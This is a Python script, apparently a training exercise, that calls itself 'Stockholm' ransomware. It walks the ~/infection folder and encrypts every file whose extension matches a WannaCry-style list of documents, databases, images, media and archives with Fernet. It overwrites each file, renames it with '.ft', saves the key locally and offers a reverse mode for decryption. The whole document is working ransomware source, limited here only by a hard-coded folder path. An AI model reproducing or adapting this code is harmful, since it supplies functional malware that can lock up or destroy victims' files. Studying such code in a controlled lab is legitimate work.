import argparse
from cryptography.fernet import Fernet, InvalidToken

import os

Path = f"{os.environ['HOME']}/infection"
WannaCry_extensions = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx',
    '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1',
    '.pdf', '.dwg', '.onetoc2', '.snt', '.hwp',
    '.xlam', '.xll', '.xlm', '.xlw', '.pot', '.pps',
    '.ppsm', '.ppsx', '.ppam', '.potx', '.potm',
    '.edb', '.sql', '.mdb', '.accdb', '.mdf', '.ldf',
    '.jpg', '.jpeg', '.raw', '.png', '.bmp', '.gif',
    '.tif', '.tiff', '.nef', '.psd', '.ai', '.svg',
    '.djvu', '.mp3', '.mp4', '.mkv', '.avi', '.wmv',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bak'

]


def parse_args():
    parser = argparse.ArgumentParser(
        description="Stockholm: Ransomware to encrypt and decrypt /Home/infection files")
    parser.add_argument('-v', '--version', action='version',
                        version='%(prog)s 1.0')
    parser.add_argument('-r', '--reverse', type=str, metavar='KEY',
                        help='Reverse the infection using the provided key')
    parser.add_argument('-s', '--silent', action='store_true',
                        help='Suppress output during the process')
    return parser.parse_args()


def save_key(key):
    try:
        if not os.path.exists(Path):
            os.makedirs(Path)
        with open(f"{Path}/wannaCry.key", 'wb') as f:
            f.write(key)
    except Exception as e:
        print(f'Error saving key: {e}')
        exit()


def reverse_infection(key):
    try:
        fernet = Fernet(key)
        for root, dirs, files in os.walk(Path):
            for file in files:
                if file.endswith('.ft'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    try:
                        decrypted_data = fernet.decrypt(data)
                        new_path = file_path[:-3] 
                        with open(file_path, 'wb') as f:
                            f.write(decrypted_data)
                        os.rename(file_path, new_path)
                    except InvalidToken:
                        print(
                            f"Invalid key or file already decrypted: {file_path}")
    except Exception as e:
        print(f"Error during decryption: {e}")
        exit()


def wannaCry(args):
    try:
        Secret_key = None
        if os.path.exists(f"{Path}/wannaCry.key"):
            with open(f"{Path}/wannaCry.key", 'rb') as f:
                Secret_key = f.read()
        else:
            Secret_key = Fernet.generate_key()
            save_key(Secret_key)
        fernet = Fernet(Secret_key)
        for root, dirs, files in os.walk(Path):
            for file in files:
                if any(file.endswith(ext) for ext in WannaCry_extensions):
                    file_path = os.path.join(root, file)
                    if not args.silent:
                        print("Encrypted:", file_path)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = fernet.encrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                    os.rename(file_path, file_path + '.ft')
    except Exception as e:
        print(f"Error during encryption: {e}")
        exit()


def main():
    args = parse_args()
    if args.reverse:
        reverse_infection(args.reverse)
    else:
        wannaCry(args)


if __name__ == '__main__':
    main()
